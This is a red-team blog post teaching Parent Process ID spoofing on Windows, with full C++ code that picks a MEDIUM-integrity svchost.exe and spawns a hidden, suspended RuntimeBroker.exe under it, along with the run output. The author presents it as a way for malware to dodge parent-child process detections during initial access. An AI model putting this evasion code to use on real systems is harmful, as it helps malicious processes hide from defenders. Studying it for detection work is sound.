---
layout: post
title: "Picky PPID Spoofing"
date: 2021-11-22
categories: [redteam, maldev]
description: "Performing PPID Spoofing by targeting a parent process with a specific integrity level."
header-img: /static/img/2021-11-22-picky-ppid-spoofing/spawned.png
image: /static/img/2021-11-22-picky-ppid-spoofing/spawned.png
---

**Parent Process ID (PPID) Spoofing** is one of the techniques employed by malware authors to blend in the target system. This is done by making the malicious process look like it was spawned by another process. This helps evade detections that are based on anomalous parent-child process relationships.

When I started learning and implementing this technique, the first question that popped into my mind is what parent-child process relationship should I spoof. 

Using [Process Hacker](https://processhacker.sourceforge.io/), I noticed several instances of the `RuntimeBroker.exe` process running under the parent process `svchost.exe`. If this parent-child process relationship is common, then this is a good candidate for spoofing.

![Several RuntimBroker.exe Running Under svchost.exe](/static/img/2021-11-22-picky-ppid-spoofing/runtimebroker.png)

## The Usual PPID Spoofing

To implement **PPID Spoofing**, the following code was used. The `ggetPPID` function is used to retrieve the PID of the parent process we want to spoof. In this case, we're trying to get the PID of the `svchost.exe` process. The code then uses the WinAPI function `CreateProcess` to spawn a new process, which in our case is `RuntimeBroker.exe`.
```cpp
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

DWORD getPPID(LPCWSTR processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, processName))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {
    STARTUPINFOEX si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

    LPCWSTR parentProcess = L"svchost.exe";
    DWORD parentPID = getPPID(parentProcess);
    printf("[+] Spoofing %ws (PID: %u) as the parent process.\n", parentProcess, parentPID);

    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, false, parentPID);
    if (!procHandle) {
        wchar_t errorMessage[256];
        FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), errorMessage, 255, NULL);
        printf("[!] Failed to get a handle with the following error: %ws\n", errorMessage);
        return -1;
    }
    printf("[+] Got a handle of 0x%p\n", procHandle);

    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &procHandle, sizeof(HANDLE), NULL, NULL);

    LPCWSTR spawnProcess = L"C:\\Windows\\System32\\RuntimeBroker.exe";
    CreateProcess(spawnProcess, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (STARTUPINFO*)&si, &pi);
    printf("[+] Spawning %ws (PID: %u)\n", spawnProcess, pi.dwProcessId);

    return 0;
}
```

However, the code didn't work as expected and we got an "**Access is denied**" error. 
```powershell
PS C:\Users\Meelo\Desktop> .\PickyPPIDSpoofing.exe
[+] Spoofing svchost.exe (PID: 860) as the parent process.
[!] Failed to get a handle with the following error: Access is denied.
```

Based on the output above, the code is trying to spoof `svchost.exe` with a PID of **860**. And if we look at [Process Hacker](https://processhacker.sourceforge.io/), this process has an integrity level of **SYSTEM**. Since we're running as a standard user, with **MEDIUM** integrity level, we don't have access to processes running with **SYSTEM** integrity level.

![Integrity Level of svchost.exe](/static/img/2021-11-22-picky-ppid-spoofing/integrity-level.png)

So how can we solve this? If we scroll down in [Process Hacker](https://processhacker.sourceforge.io/), we can see some `svchost.exe` processes with an integrity level of **MEDIUM**. 

![svchost.exe Running with MEDIUM Integrity Level](/static/img/2021-11-22-picky-ppid-spoofing/svchost-medium.png)

Technically, this can be solved easily by hard-coding the PID of the parent process we're targetting. In the image above, that would be **2740**, **2824**, or **4620**. However, this is only applicable if we could get the PIDs of the processes running on the target system; which means we should already have access to our target.

This wouldn't work if you're implementing PPID Spoofing in your malware that will be used to gain initial access on your target.

## The Picky PPID Spoofing

By analyzing the console output above, we can see that the `getPPID` function only returns the very first instance of `svchost.exe` (with a PID of **860**), which has an integrity level of **SYSTEM**.

![First Instance of svchost.exe](/static/img/2021-11-22-picky-ppid-spoofing/first-instance.png)

So to solve this issue, we have to add another function that would check the integrity level of each process. This is done using the following code, which uses the WinAPI function `GetTokenInformation` to retrieve information about the access token associated with a process. Then a comparison is made against [well-known SIDs](https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids) to identify the integrity level of the process. 
```cpp
LPCWSTR getIntegrityLevel(HANDLE hProcess) {
    HANDLE hToken;
    OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
    
    DWORD cbTokenIL = 0;
    PTOKEN_MANDATORY_LABEL pTokenIL = NULL;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL);
    pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
    GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL, cbTokenIL, &cbTokenIL);

    DWORD dwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

    if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
        return L"LOW";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
        return L"MEDIUM";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
        return L"HIGH";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
        return L"SYSTEM";
    }
}
```

This `getIntegrityLevel` function is used within the `getPPID` function so it will only return the PID of the parent process with a specific integrity level, which is **MEDIUM** in our case.
```cpp
DWORD getPPID(LPCWSTR processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, processName)) {
                HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);
                if (hProcess) {
                    LPCWSTR integrityLevel = NULL;
                    integrityLevel = getIntegrityLevel(hProcess);
                    if (!wcscmp(integrityLevel, L"MEDIUM")) {
                        break;
                    }
                }
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}
```

## The Finally

Here's what the final code looks like.
```cpp
#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>

LPCWSTR getIntegrityLevel(HANDLE hProcess) {
    HANDLE hToken;
    OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
    
    DWORD cbTokenIL = 0;
    PTOKEN_MANDATORY_LABEL pTokenIL = NULL;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbTokenIL);
    pTokenIL = (TOKEN_MANDATORY_LABEL*)LocalAlloc(LPTR, cbTokenIL);
    GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIL, cbTokenIL, &cbTokenIL);

    DWORD dwIntegrityLevel = *GetSidSubAuthority(pTokenIL->Label.Sid, 0);

    if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) {
        return L"LOW";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
        return L"MEDIUM";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
        return L"HIGH";
    }
    else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
        return L"SYSTEM";
    }
}

DWORD getPPID(LPCWSTR processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, processName)) {
                HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);
                if (hProcess) {
                    LPCWSTR integrityLevel = NULL;
                    integrityLevel = getIntegrityLevel(hProcess);
                    if (!wcscmp(integrityLevel, L"MEDIUM")) {
                        break;
                    }
                }
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {
    STARTUPINFOEX si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

    LPCWSTR parentProcess = L"svchost.exe";
    DWORD dwParentPID = getPPID(parentProcess);
    printf("[+] Spoofing %ws (PID: %u) as the parent process.\n", parentProcess, dwParentPID);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, dwParentPID);
    if (!hProcess) {
        wchar_t errorMessage[256];
        FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), errorMessage, 255, NULL);
        printf("[!] Failed to get a handle with the following error: %ws\n", errorMessage);
        return -1;
    }
    printf("[+] Got a handle of 0x%p\n", hProcess);

    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL);

    LPCWSTR spawnProcess = L"C:\\Windows\\System32\\RuntimeBroker.exe";
    CreateProcess(spawnProcess, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (STARTUPINFO*)&si, &pi);
    printf("[+] Spawning %ws (PID: %u)\n", spawnProcess, pi.dwProcessId);

    return 0;
}
```

If we run this code, we got the following output. 
```powershell
PS C:\Users\Meelo\Desktop> .\PickyPPIDSpoofing.exe
[+] Spoofing svchost.exe (PID: 2740) as the parent process.
[+] Got a handle of 0x00000000000000AC
[+] Spawning C:\Windows\System32\RuntimeBroker.exe (PID: 772)
```

The main difference of this output from the previous one is the PID of `svchost.exe` has changed from **860** to **2740**. We can also see that we've successfully obtained a process handle. As a result, `RuntimeBroker.exe` was spawned under the parent process of `svchost.exe`.

![Successfully Spawned RuntimeBroker.exe](/static/img/2021-11-22-picky-ppid-spoofing/spawned.png)